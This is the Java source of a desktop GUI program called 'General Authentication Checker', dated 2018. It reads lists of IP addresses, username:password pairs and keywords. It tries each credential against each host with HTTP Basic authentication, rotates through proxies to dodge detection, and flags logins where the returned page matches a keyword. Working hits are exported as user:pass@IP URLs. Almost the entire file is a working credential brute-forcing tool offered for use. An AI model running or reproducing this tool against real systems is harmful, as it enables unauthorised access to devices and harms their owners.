package gacheck;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.EventQueue;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.MalformedURLException;
import java.net.Proxy;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Scanner;

import javax.swing.ButtonGroup;
import javax.swing.JButton;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JProgressBar;
import javax.swing.JRadioButton;
import javax.swing.JScrollPane;
import javax.swing.JSpinner;
import javax.swing.JTabbedPane;
import javax.swing.JTable;
import javax.swing.JTextPane;
import javax.swing.SwingConstants;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.border.EtchedBorder;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;
import javax.swing.table.DefaultTableModel;
import java.awt.Font;

public class GeneralAuthChecker {

	private JFrame frmGAChecker;
	private JTable resultTable;

	/**
	 * Launch the application.
	 */
	public static void main(String[] args) {
		EventQueue.invokeLater(new Runnable() {
			public void run() {
				try {
					try {
						// Set cross-platform Java L&F (also called "Metal")
						UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
					} catch (UnsupportedLookAndFeelException e) {
						// handle exception
					} catch (ClassNotFoundException e) {
						// handle exception
					} catch (InstantiationException e) {
						// handle exception
					} catch (IllegalAccessException e) {
						// handle exception
					}

					GeneralAuthChecker window = new GeneralAuthChecker();
					window.frmGAChecker.setVisible(true);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		});
	}

	/*
	 * Create the application.
	 */
	public GeneralAuthChecker() {
		initialize();
	}

	/*
	 * Initialize the contents of the frame.
	 */
	private void initialize() {
		frmGAChecker = new JFrame();
		frmGAChecker.setFont(new Font("Tahoma", Font.PLAIN, 11));
		frmGAChecker.setResizable(false);
		frmGAChecker.setTitle("General Authentication Checker - Public Release");
		frmGAChecker.setBounds(100, 100, 751, 421);
		frmGAChecker.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

		JTabbedPane tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		tabbedPane.setBounds(0, 0, 766, 385);
		frmGAChecker.getContentPane().add(tabbedPane);

		JPanel StartPanel = new JPanel();
		tabbedPane.addTab("Start", null, StartPanel, null);
		StartPanel.setLayout(null);

		JLabel lblLogs = new JLabel("Logs:");
		lblLogs.setBounds(549, 8, 33, 14);
		StartPanel.add(lblLogs);

		JScrollPane loggingScrollPane = new JScrollPane();
		loggingScrollPane.setBounds(549, 25, 181, 328);
		StartPanel.add(loggingScrollPane);

		JTextPane loggingPane = new JTextPane();
		loggingPane.setForeground(Color.BLACK);
		loggingPane.setDisabledTextColor(Color.BLACK);
		loggingPane.setEnabled(false);
		loggingScrollPane.setViewportView(loggingPane);

		loggingPane.setText("Program Started");

		// Result table stuff

		String column_names[] = { "IP", "Username", "Password" };
		DefaultTableModel table_model = new DefaultTableModel(column_names, 0);
		resultTable = new JTable(table_model);

		JScrollPane resultScrollPane = new JScrollPane(resultTable);
		resultScrollPane.setBounds(10, 25, 529, 328);
		StartPanel.add(resultScrollPane);

		resultTable.setFillsViewportHeight(true);

		JLabel lblResults = new JLabel("Results:");
		lblResults.setBounds(10, 8, 47, 14);
		StartPanel.add(lblResults);

		JButton exportButton = new JButton("Export...");
		exportButton.setToolTipText("Export the programs results to a txt file");
		exportButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				// Export button

				// Make sure there are rows that exist
				if (resultTable.getModel().getRowCount() <= 0) {
					JOptionPane.showMessageDialog(frmGAChecker, "There are no values to export.", "Export error",
							JOptionPane.ERROR_MESSAGE);
				} else {
					// Create file chooser dialog
					JFileChooser fileChooser = new JFileChooser();
					fileChooser.setDialogTitle("Specify a file to save");
					int userSelection = fileChooser.showSaveDialog(frmGAChecker);

					// If they chose a file
					if (userSelection == JFileChooser.APPROVE_OPTION) {
						// Create file object
						File fileToSave = fileChooser.getSelectedFile();

						try {
							// Print writer and variables
							PrintWriter out = new PrintWriter(fileToSave);
							String ip;
							String username;
							String password;

							// Go to each row and add them to the print writer
							for (int i = 0; i < resultTable.getRowCount(); i++) {
								ip = resultTable.getModel().getValueAt(i, 0).toString();
								username = resultTable.getModel().getValueAt(i, 1).toString();
								password = resultTable.getModel().getValueAt(i, 2).toString();
								out.println("http://" + username + ":" + password + "@" + ip + "/");
							}

							// Close the print writer
							out.close();

							JOptionPane.showMessageDialog(frmGAChecker, "Results exported to " + fileToSave.getName(),
									"File exported", JOptionPane.INFORMATION_MESSAGE);
						} catch (FileNotFoundException e1) {
							e1.printStackTrace();
						}
					}
				}
			}
		});
		exportButton.setBounds(459, 8, 80, 14);
		StartPanel.add(exportButton);

		// Result table stuff

		JPanel ListsPanel = new JPanel();
		tabbedPane.addTab("Lists", null, ListsPanel, null);

		JLabel lblKeywords = new JLabel("Keywords:");
		lblKeywords.setBounds(494, 9, 70, 14);

		JScrollPane keywordScrollPane = new JScrollPane();
		keywordScrollPane.setBounds(494, 25, 234, 328);

		JTextPane keywordTextPane = new JTextPane();
		keywordScrollPane.setViewportView(keywordTextPane);

		JButton keywordLoadButton = new JButton("Load...");
		keywordLoadButton.setBounds(648, 9, 80, 14);
		keywordLoadButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				// Load keywords
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
				int result = fileChooser.showOpenDialog(frmGAChecker);
				if (result == JFileChooser.APPROVE_OPTION) {
					// user selects a file
					File selectedFile = fileChooser.getSelectedFile();

					// TODO: Make sure it is txt

					String nl;
					try {
						Scanner sc = new Scanner(selectedFile);
						while (sc.hasNextLine()) {
							nl = sc.nextLine();
							keywordTextPane.setText(keywordTextPane.getText() + "\n" + nl);
						}
						sc.close();
					} catch (FileNotFoundException e1) {
						// TODO: Replace with a popup
						e1.printStackTrace();
					}
				}
			}
		});
		ListsPanel.setLayout(null);

		JLabel lblIps = new JLabel("IPs:");
		lblIps.setBounds(10, 9, 27, 14);
		ListsPanel.add(lblIps);

		JScrollPane IpsScrollPane = new JScrollPane();
		IpsScrollPane.setBounds(10, 25, 234, 328);

		JTextPane ipsTextPane = new JTextPane();
		IpsScrollPane.setViewportView(ipsTextPane);
		ListsPanel.add(IpsScrollPane);

		JButton IpsLoadButton = new JButton("Load...");
		IpsLoadButton.setBounds(164, 9, 80, 14);
		IpsLoadButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				// Load ips
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
				int result = fileChooser.showOpenDialog(frmGAChecker);
				if (result == JFileChooser.APPROVE_OPTION) {
					// user selects a file
					File selectedFile = fileChooser.getSelectedFile();

					// TODO: Make sure it is txt

					String nl;
					try {
						Scanner sc = new Scanner(selectedFile);
						while (sc.hasNextLine()) {
							nl = sc.nextLine();
							ipsTextPane.setText(ipsTextPane.getText() + "\n" + nl);
						}
						sc.close();
					} catch (FileNotFoundException e1) {
						// TODO: Replace with a popup
						e1.printStackTrace();
					}
				}
			}
		});
		ListsPanel.add(IpsLoadButton);

		JLabel lblCredentials = new JLabel("Credentials:");
		lblCredentials.setBounds(254, 9, 70, 14);
		ListsPanel.add(lblCredentials);

		JScrollPane credentialScrollPane = new JScrollPane();
		credentialScrollPane.setBounds(252, 25, 234, 328);

		JTextPane credentialTextPane = new JTextPane();
		credentialScrollPane.setViewportView(credentialTextPane);
		ListsPanel.add(credentialScrollPane);

		JButton credentialLoadButton = new JButton("Load...");
		credentialLoadButton.setBounds(406, 9, 80, 14);
		credentialLoadButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				// Load credentials
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
				int result = fileChooser.showOpenDialog(frmGAChecker);
				if (result == JFileChooser.APPROVE_OPTION) {
					// user selects a file
					File selectedFile = fileChooser.getSelectedFile();

					// TODO: Make sure it is txt

					String nl;
					try {
						Scanner sc = new Scanner(selectedFile);
						while (sc.hasNextLine()) {
							nl = sc.nextLine();
							credentialTextPane.setText(credentialTextPane.getText() + "\n" + nl);
						}
						sc.close();
					} catch (FileNotFoundException e1) {
						// TODO: Replace with a popup
						e1.printStackTrace();
					}
				}
			}
		});

		ListsPanel.add(credentialLoadButton);
		ListsPanel.add(lblKeywords);
		ListsPanel.add(keywordScrollPane);
		ListsPanel.add(keywordLoadButton);

		JPanel SettingsPanel = new JPanel();
		tabbedPane.addTab("Settings", null, SettingsPanel, null);
		SettingsPanel.setLayout(null);

		JPanel connectionPanel = new JPanel();
		connectionPanel.setBorder(new EtchedBorder(EtchedBorder.LOWERED, null, null));
		connectionPanel.setBounds(10, 25, 186, 328);
		SettingsPanel.add(connectionPanel);
		connectionPanel.setLayout(null);

		JLabel lblDelayBetweenRequests = new JLabel("Delay (ms):");
		lblDelayBetweenRequests
				.setToolTipText("This is how long the program will wait before checking another credential");
		lblDelayBetweenRequests.setBounds(10, 8, 66, 14);
		connectionPanel.add(lblDelayBetweenRequests);

		JSpinner spinner = new JSpinner();
		spinner.setToolTipText("This is how long the program will wait before checking another credential");
		spinner.setBounds(75, 5, 50, 20);
		connectionPanel.add(spinner);

		// Radio button 1
		JRadioButton rdbtnChangePerCredentals = new JRadioButton("Change per X credentials");
		rdbtnChangePerCredentals.setEnabled(false);
		rdbtnChangePerCredentals.setBounds(10, 257, 166, 23);

		// Radio button 2
		JRadioButton rdbtnChangePerX = new JRadioButton("Change per X IPs");
		rdbtnChangePerX.setEnabled(false);
		rdbtnChangePerX.setSelected(true);
		rdbtnChangePerX.setBounds(10, 239, 166, 23);

		// Add them to a group
		ButtonGroup group = new ButtonGroup();
		group.add(rdbtnChangePerX);
		group.add(rdbtnChangePerCredentals);

		// Add them to the jframe
		connectionPanel.add(rdbtnChangePerCredentals);
		connectionPanel.add(rdbtnChangePerX);

		JSpinner proxySpinner = new JSpinner();
		proxySpinner.setEnabled(false);
		proxySpinner.setBounds(75, 283, 40, 20);
		connectionPanel.add(proxySpinner);

		JLabel lblXWill = new JLabel("X:");
		lblXWill.setEnabled(false);
		lblXWill.setBounds(53, 286, 15, 14);
		connectionPanel.add(lblXWill);

		JLabel lblLeavingXAt = new JLabel("If x is 0, proxy will not change");
		lblLeavingXAt.setEnabled(false);
		lblLeavingXAt.setHorizontalAlignment(SwingConstants.CENTER);
		lblLeavingXAt.setBounds(10, 303, 166, 14);
		connectionPanel.add(lblLeavingXAt);

		JTextPane proxiesTextPane = new JTextPane();
		proxiesTextPane.setEnabled(false);

		JScrollPane proxiesScrollPane = new JScrollPane();
		proxiesScrollPane.setEnabled(false);
		proxiesScrollPane.setBounds(10, 33, 166, 177);
		connectionPanel.add(proxiesScrollPane);

		proxiesScrollPane.setViewportView(proxiesTextPane);

		// Start button declaration
		JButton btnLoadProxies = new JButton("Load...");
		btnLoadProxies.setEnabled(false);

		JCheckBox chckbxUseProxies = new JCheckBox("Use HTTP Proxies");
		proxiesScrollPane.setColumnHeaderView(chckbxUseProxies);
		chckbxUseProxies.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				// If user wants to use http proxies, enable the http proxy options
				if (chckbxUseProxies.isSelected()) {
					// Enable options

					// Yes, I know I could add all of these to an object arraylist, then
					// enable/disable them through a loop. However, frick that lol.

					rdbtnChangePerCredentals.setEnabled(true);
					rdbtnChangePerX.setEnabled(true);
					proxySpinner.setEnabled(true);
					lblXWill.setEnabled(true);
					lblLeavingXAt.setEnabled(true);
					proxiesTextPane.setEnabled(true);
					proxiesScrollPane.setEnabled(true);
					btnLoadProxies.setEnabled(true);
				} else {
					// Disable options
					rdbtnChangePerCredentals.setEnabled(false);
					rdbtnChangePerX.setEnabled(false);
					proxySpinner.setEnabled(false);
					lblXWill.setEnabled(false);
					lblLeavingXAt.setEnabled(false);
					proxiesTextPane.setEnabled(false);
					proxiesScrollPane.setEnabled(false);
					btnLoadProxies.setEnabled(false);
				}
			}
		});
		chckbxUseProxies.setHorizontalAlignment(SwingConstants.CENTER);

		// Finish button declaration
		btnLoadProxies.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				// Load proxies
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setCurrentDirectory(new File(System.getProperty("user.home")));
				int result = fileChooser.showOpenDialog(frmGAChecker);
				if (result == JFileChooser.APPROVE_OPTION) {
					// user selects a file
					File selectedFile = fileChooser.getSelectedFile();

					// TODO: Make sure it is txt

					String nl;
					try {
						Scanner sc = new Scanner(selectedFile);
						while (sc.hasNextLine()) {
							nl = sc.nextLine();
							proxiesTextPane.setText(proxiesTextPane.getText() + "\n" + nl);
						}
						sc.close();
					} catch (FileNotFoundException e1) {
						// TODO: Replace with a popup
						e1.printStackTrace();
					}
				}
			}
		});
		btnLoadProxies.setBounds(10, 213, 166, 23);
		connectionPanel.add(btnLoadProxies);

		JLabel lblConnection = new JLabel("Connection:");
		lblConnection.setBounds(10, 11, 74, 14);
		SettingsPanel.add(lblConnection);

		JLabel lblMoreSettingsComing = new JLabel(
				"Some settings have been removed because they were not user friendly at all");
		lblMoreSettingsComing.setBounds(265, 161, 375, 14);
		SettingsPanel.add(lblMoreSettingsComing);

		JPanel AboutPanel = new JPanel();
		tabbedPane.addTab("About", null, AboutPanel, null);
		AboutPanel.setLayout(new BorderLayout(0, 0));

		JLabel lblNewLabel = new JLabel("Digital Disarray June-27-2018");
		lblNewLabel.setHorizontalAlignment(SwingConstants.CENTER);
		AboutPanel.add(lblNewLabel);

		JLabel lblDontSkidThis = new JLabel("Don't be a skid");
		lblDontSkidThis.setHorizontalAlignment(SwingConstants.CENTER);
		AboutPanel.add(lblDontSkidThis, BorderLayout.SOUTH);

		JProgressBar ipProgressBar = new JProgressBar();
		ipProgressBar.setToolTipText("Progress bar for checking the ips");
		ipProgressBar.setBounds(55, 8, 307, 7);
		StartPanel.add(ipProgressBar);

		JProgressBar credProgressBar = new JProgressBar();
		credProgressBar.setToolTipText("Progress bar for checking the ips");
		credProgressBar.setBounds(55, 15, 307, 7);
		StartPanel.add(credProgressBar);

		JButton startButton = new JButton("Start");
		startButton.setToolTipText("This will start testing credentials against ips");
		startButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				// ==================== START ====================

				// Check if we have all things needed
				if (ipsTextPane.getText().equalsIgnoreCase("")) {
					JOptionPane.showMessageDialog(frmGAChecker, "You need ips to start.", "Start error",
							JOptionPane.ERROR_MESSAGE);
					loggingPane.setText(loggingPane.getText() + "\nMissing ip(s).");
				} else if (credentialTextPane.getText().equalsIgnoreCase("")) {
					JOptionPane.showMessageDialog(frmGAChecker, "You need credentials to start.", "Start error",
							JOptionPane.ERROR_MESSAGE);
					loggingPane.setText(loggingPane.getText() + "\nMissing credential(s).");
				} else if (keywordTextPane.getText().equalsIgnoreCase("")) {
					JOptionPane.showMessageDialog(frmGAChecker, "You need keywords to start.", "Start error",
							JOptionPane.ERROR_MESSAGE);
					loggingPane.setText(loggingPane.getText() + "\nMissing keyword(s).");
				} else if (chckbxUseProxies.isSelected() && proxiesTextPane.getText().equalsIgnoreCase("")) {
					JOptionPane.showMessageDialog(frmGAChecker, "Proxies are enabled, but none were detected.",
							"Start error", JOptionPane.ERROR_MESSAGE);
					loggingPane.setText(loggingPane.getText() + "\nMissing proxies.");
				} else {
					loggingPane.setText(loggingPane.getText() + "\nStarting...");

					// Variables used to store info
					ArrayList<String> ips = new ArrayList<String>();
					ArrayList<String> creds = new ArrayList<String>();
					ArrayList<String> keywords = new ArrayList<String>();
					ArrayList<String> proxies = new ArrayList<String>();
					int ipsAdded = 0;
					int credsAdded = 0;
					int keywordsAdded = 0;
					int proxiesAdded = 0;

					// Assign values to the vars
					for (String ip : ipsTextPane.getText().split("\n")) {
						ips.add(ip);
						ipsAdded++;
					}

					for (String cred : credentialTextPane.getText().split("\n")) {
						creds.add(cred);
						credsAdded++;
					}

					for (String keyword : keywordTextPane.getText().split("\n")) {
						keywords.add(keyword);
						keywordsAdded++;
					}

					for (String proxy : proxiesTextPane.getText().split("\n")) {
						proxies.add(proxy);
						proxiesAdded++;
					}

					loggingPane.setText(loggingPane.getText() + "\nIPs Added: " + ipsAdded + "\nCreds Added: "
							+ credsAdded + "\nKeywords Added: " + keywordsAdded);

					if (chckbxUseProxies.isSelected()) {
						loggingPane.setText(loggingPane.getText() + "\nProxies Added: " + proxiesAdded);
					}

					// Objects and Vars used for the checker
					URL url;
					URLConnection urlConnection = null;
					InputStreamReader isr;
					String encodedCred;

					String result;
					int numCharsRead;
					StringBuffer sb;
					char[] charArray;

					DefaultTableModel model;

					// Proxy vars
					int countToX = 0;
					int currentProxy = 0;
					Proxy proxy;

					// Progress bar setup
					ipProgressBar.setMaximum(ips.size());
					credProgressBar.setMaximum(creds.size());
					int ipProgress = 0;
					int credProgress = 0;

					// Go through all ips and creds
					for (String ip : ips) {
						// Set progress
						ipProgressBar.setValue(ipProgress);
						ipProgress++;

						// Every x ips
						if (chckbxUseProxies.isSelected() && rdbtnChangePerX.isSelected()) {
							// Add to the counter
							countToX++;
							if (countToX == (int) proxySpinner.getValue()) {
								// We have hit the threshold
								if (currentProxy++ > proxies.size()) {
									currentProxy = 0;
								} else {
									currentProxy++;
								}
								countToX = 0;
							}
						}

						for (String cred : creds) {
							// Set progress
							credProgressBar.setValue(credProgress);
							credProgress++;

							// Every x creds
							if (chckbxUseProxies.isSelected() && rdbtnChangePerCredentals.isSelected()) {
								// Add to the counter
								countToX++;
								if (countToX == (int) proxySpinner.getValue()) {
									// We have hit the threshold
									if (currentProxy++ > proxies.size()) {
										currentProxy = 0;
									} else {
										currentProxy++;
									}
									countToX = 0;
								}
							}

							loggingPane.setText(loggingPane.getText() + "\n" + cred + " @ " + ip);
							try {
								// Encode the cred
								encodedCred = new String(Base64.getEncoder().encode(cred.getBytes()));

								// Make a connection and get input stream but use proxy if enabled
								url = new URL("http://" + ip + "/");

								if (chckbxUseProxies.isSelected()) {
									proxy = new Proxy(Proxy.Type.HTTP,
											new InetSocketAddress(proxies.get(currentProxy).split(":")[0],
													Integer.parseInt(proxies.get(currentProxy).split(":")[1])));
									urlConnection = url.openConnection(proxy);
								} else {
									urlConnection = url.openConnection();
								}
								
								urlConnection.setRequestProperty("Authorization", "Basic " + encodedCred);
								
								try {
									Thread.sleep(1000);
								} catch (InterruptedException e1) {
									e1.printStackTrace();
								}
								
								isr = new InputStreamReader(urlConnection.getInputStream());

								// Get the page
								numCharsRead = 0;
								charArray = new char[1024];
								sb = new StringBuffer();
								while ((numCharsRead = isr.read(charArray)) > 0) {
									sb.append(charArray, 0, numCharsRead);
								}
								result = sb.toString();

								// Search the page for keywords
								for (String keyword : keywords) {
									// TODO: Make to lower case a setting option
									if (result.toLowerCase().contains(keyword)) {
										model = (DefaultTableModel) resultTable.getModel();
										model.addRow(new Object[] { ip, cred.split(":")[0], cred.split(":")[1] });
										loggingPane.setText(loggingPane.getText() + "\nFound valid credentials.");
										break;
									}
								}
							} catch (MalformedURLException e1) {
								loggingPane.setText(loggingPane.getText() + "\nMalformedURLException: http://" + ip
										+ "/\nSkipping....");
							} catch (IOException e1) {
								// This means authentication failed
								// TODO: Failed auth counter?
								e1.printStackTrace();
								loggingPane.setText(loggingPane.getText() + "\nFailed.");
							}
						}

						// Sleep for the user set delay
						try {
							Thread.sleep(Integer.toUnsignedLong((int) spinner.getValue()));
						} catch (InterruptedException e1) {
							e1.printStackTrace();
						}
					}
				}
			}
		});
		startButton.setBounds(369, 8, 80, 14);
		StartPanel.add(startButton);

		JButton logsExportButton = new JButton("Export...");
		logsExportButton.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				// Create file chooser dialog
				JFileChooser fileChooser = new JFileChooser();
				fileChooser.setDialogTitle("Specify a file to save");
				int userSelection = fileChooser.showSaveDialog(frmGAChecker);

				// If they chose a file
				if (userSelection == JFileChooser.APPROVE_OPTION) {
					// Create file object
					File fileToSave = fileChooser.getSelectedFile();

					try {
						// Print writer and variables
						PrintWriter out = new PrintWriter(fileToSave);

						out.println(loggingPane.getText());

						// Close the print writer
						out.close();

						JOptionPane.showMessageDialog(frmGAChecker, "Logs exported to " + fileToSave.getName(),
								"File exported", JOptionPane.INFORMATION_MESSAGE);
					} catch (FileNotFoundException e1) {
						e1.printStackTrace();
					}
				}
			}
		});
		logsExportButton.setBounds(650, 8, 80, 14);
		StartPanel.add(logsExportButton);

	}
}
